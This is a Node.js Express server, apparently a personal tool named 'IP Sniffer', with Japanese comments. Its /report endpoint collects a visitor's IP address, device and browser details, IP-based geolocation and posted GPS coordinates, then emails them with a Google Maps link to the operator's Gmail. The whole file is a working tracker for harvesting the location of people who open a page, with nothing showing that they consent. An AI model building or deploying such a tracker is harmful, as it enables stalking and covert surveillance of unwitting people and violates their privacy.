require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/report', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const ua = uaParser(req.headers['user-agent']);
  const { latitude, longitude } = req.body;

  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  let geo = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    geo = await geoRes.json();
  } catch (err) {
    console.error('IPジオAPIエラー:', err);
  }

  // ✉️ Gmailで送信
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `"IP Sniffer" <${process.env.GMAIL_USER}>`,
    to: process.env.GMAIL_USER, // 自分宛
    subject: '📡 アクセス情報通知',
    text: `
📸 アクセス情報：
- IPアドレス: ${ip}
- 国: ${geo.country_name || '不明'}
- 地域: ${geo.region || '不明'}
- 市区町村: ${geo.city || '不明'}
- 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
- GPS位置: ${locationLink}
- アクセス時間: ${new Date().toLocaleString()}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('✅ Gmail送信成功');
  } catch (error) {
    console.error('❌ Gmail送信失敗:', error);
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`📡 Server running on http://localhost:${PORT}`);
});
